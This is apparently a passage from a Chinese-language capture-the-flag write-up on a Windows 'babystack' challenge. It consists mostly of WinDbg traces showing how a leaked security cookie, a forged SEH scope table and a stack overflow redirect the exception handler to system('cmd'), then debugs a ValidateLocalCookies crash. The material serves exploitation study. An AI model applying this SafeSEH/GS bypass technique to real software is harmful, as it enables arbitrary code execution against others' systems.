    eip=606eb356 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
    VCRUNTIME140!_except_handler4_common+0x66:
    606eb356 8d0443          lea     eax,[ebx+eax*2]
    0:000> p//edi存放的是scope table，这里会计算handler function的位置
    eax=00000004 ebx=00000000 ecx=b36d8e81 edx=770b6d8d esi=0027fc0c edi=01273688
    eip=606eb359 esp=0027f58c ebp=0027f5b4 iopl=0         nv up ei pl nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000213
    VCRUNTIME140!_except_handler4_common+0x69:
    606eb359 8b4c8704        mov     ecx,dword ptr [edi+eax*4+4] ds:0023:0127369c=01271348
    0:000> dd 01273688//edi的值指向scope table
    01273688  ffffffe4 00000000 ffffff20 00000000
    01273698  fffffffe 01271348 0127134e 00000000
    012736a8  fffffffe 00000000 ffffffcc 00000000
    012736b8  fffffffe 012716ad 012716c1 00000000
可以看到，最后通过 scope table 计算了 handler function
的指针的值，随后会在最后跳转时用到，那么这个地方就很有意思了，我们可以构造一个 scope table，也就是 fake struc，然后和泄露出来的
security cookie 做异或运算，然后把值通过栈溢出，覆盖到 seh chain 的 encode scope table 位置，这里要提一点是
fake struc 放在什么位置，以及放什么，这里我们选择的还是放在 stack
中存放变量的位置，因为放在这里不会影响到其他变量，当然可以放在栈的任何位置，只要覆盖之后不会影响到其他函数调用就可以，否则会造成不可预知的
crash，因此放在之前提到的函数内申请变量的位置是最稳的，当然这些值的相对偏移都固定，因此我们可以 leak 出来。
我们想到的栈布局如下。
首先我们通过 leak 的方法可以泄露出 security cookie，同时通过栈地址 +offset 的方法可以泄露出之前我们提到的 prev 域和
handler 域的值，这些值将在我们进行栈布局的时候用到。
exchain 中关于 prev 域和 handler 域的偏移，在栈里相对位置是固定的，所以每次程序开始给了栈地址后，我们可以直接通过栈地址和相对偏移算出
exchain 的位置，泄露出 prev 域和 handler 域的值，随后我们构造一个 fake struc，也就是 fake scope
table，根据之前我们提到关于 struc 的定义，我们可以在栈中布置这样一个值，然后将 scope table 的栈地址和 security
cookie 做异或运算，填充在 handler 之后就行了。
OK，现在我们完成了布置，这样的话可以通过 safeseh 的 check。
    0:000> p
    eax=01121460 ebx=0015fbd0 ecx=0015f61c edx=770b6c74 esi=0015f6c0 edi=00000000
    eip=7708f9f9 esp=0015f630 ebp=0015f6a8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlDispatchException+0x109:
    7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
    0:000> p
    eax=01123301 ebx=0015fbd0 ecx=62891c6f edx=00000000 esi=0015f6c0 edi=00000000
    eip=7708f9fe esp=0015f638 ebp=0015f6a8 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlDispatchException+0x10e:
    7708f9fe 84c0            test    al,al
    0:000> r al
    al=1
接下来进入 `VCRUNTIME140!_except_handler4_common` 函数中，其实通过上面的图可以看到，在 fake struc
中，我们其他值固定，只是把 handler function 的值修改成了 system('cmd') 的地址，这样根据我们上面对
`_except_handler4_common` 函数的分析，应该最后会跳转到 handler function，也就是
system（'cmd'）。首先跟入函数。
    0:000> p
    eax=00000000 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=00000000
    eip=6375b30a esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x1a://获取encode scope table
    6375b30a 8b7e08          mov     edi,dword ptr [esi+8] ds:0023:0015fbd8=764a4109
    0:000> p
    eax=00000000 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=764a4109
    eip=6375b30d esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x1d:
    6375b30d 8d4610          lea     eax,[esi+10h]
    0:000> p
    eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=764a4109
    eip=6375b310 esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    VCRUNTIME140!_except_handler4_common+0x20://和security cookie做异或
    6375b310 3339            xor     edi,dword ptr [ecx]  ds:0023:01124004=765fba5d
    0:000> p
    eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54//edi指向fake scope table
    eip=6375b312 esp=0015f58c ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    VCRUNTIME140!_except_handler4_common+0x22:
    6375b312 50              push    eax
    0:000> dd 15fb54
    0015fb54  ffffffe4 00000000 ffffff20 00000000
    0015fb64  fffffffe 01121348 0112138d//fake scope table中handler func指向system('cmd')
这里我们已经可以令 decode scope table 指向我们的 fake scope table，里面存放的 handler func 指向
system('cmd') 地址，根据我们刚才对此函数的分析，接下来应该获取 fake handler func 的值，然后跳转到
system('cmd')，获取 shell，打完收工，皆大欢喜。但是最后程序却 crash 掉了。为什么呢？
我们进行了分析发现栈中还有地方需要做 fix！我们发现在 `VCRUNTIME140!ValidateLocalCookies` 函数中，SEH
处理崩溃了。
    0:000> p
    eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54
    eip=6375b31a esp=0015f580 ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    VCRUNTIME140!_except_handler4_common+0x2a:
    6375b31a 897df8          mov     dword ptr [ebp-8],edi ss:0023:0015f5ac=56125318
    0:000> p
    eax=0015fbe0 ebx=00000000 ecx=01124004 edx=770b6d8d esi=0015fbd0 edi=0015fb54
    eip=6375b31d esp=0015f580 ebp=0015f5b4 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    VCRUNTIME140!_except_handler4_common+0x2d:
    6375b31d e87effffff      call    VCRUNTIME140!ValidateLocalCookies (6375b2a0)
    0:000> p
    STATUS_STACK_BUFFER_OVERRUN encountered
    WARNING: This break is not a step/trace completion.
    The last command has been cleared to prevent
    accidental continuation of this unrelated event.
    Check the event, location and thread before resuming.
    (19f970.19fdf4): Break instruction exception - code 80000003 (first chance)
    eax=00000000 ebx=01123130 ecx=76b5e4b4 edx=0015ef65 esi=00000000 edi=0015fb54
    eip=76b5e331 esp=0015f1ac ebp=0015f228 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    kernel32!UnhandledExceptionFilter+0x5f:
    76b5e331 cc              int     3
接下来我们跟入 `VCRUNTIME140!ValidateLocalCookies`，看看问题出在哪里。
    0:000> p//这里会将0024f748的值和esi做异或
    eax=ffffffe4 ebx=0024f764 ecx=00e21490 edx=770b6d8d esi=0024f764 edi=0024f6d8
    eip=5bf0b2bb esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    VCRUNTIME140!ValidateLocalCookies+0x1b:
    5bf0b2bb 333418          xor     esi,dword ptr [eax+ebx] ds:0023:0024f748=61616161
    0:000> p//随后将结果交给ecx
    eax=ffffffe4 ebx=0024f764 ecx=00e21490 edx=770b6d8d esi=61459605 edi=0024f6d8
    eip=5bf0b2c4 esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    VCRUNTIME140!ValidateLocalCookies+0x24:
    5bf0b2c4 8bce            mov     ecx,esi
    0:000> p
    eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
    eip=5bf0b2c6 esp=0024f0ec ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    VCRUNTIME140!ValidateLocalCookies+0x26:
    5bf0b2c6 ff5508          call    dword ptr [ebp+8]    ss:0023:0024f100=00e21490
    0:000> t//进入函数处理会将异或结果和security cookie做比较
    eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
    eip=00e21490 esp=0024f0e8 ebp=0024f0f8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    babystack+0x1490:
    00e21490 3b0d0440e200    cmp     ecx,dword ptr [babystack+0x4004 (00e24004)] ds:0023:00e24004=be69501d
    0:000> p//不相等则会跳转
    eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
    eip=00e21496 esp=0024f0e8 ebp=0024f0f8 iopl=0         ov up ei ng nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a97
    babystack+0x1496:
    00e21496 f27502          repne jne babystack+0x149b (00e2149b)           [br=1]
    0:000> p
    eax=ffffffe4 ebx=0024f764 ecx=61459605 edx=770b6d8d esi=61459605 edi=0024f6d8
    eip=00e2149b esp=0024f0e8 ebp=0024f0f8 iopl=0         ov up ei ng nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a97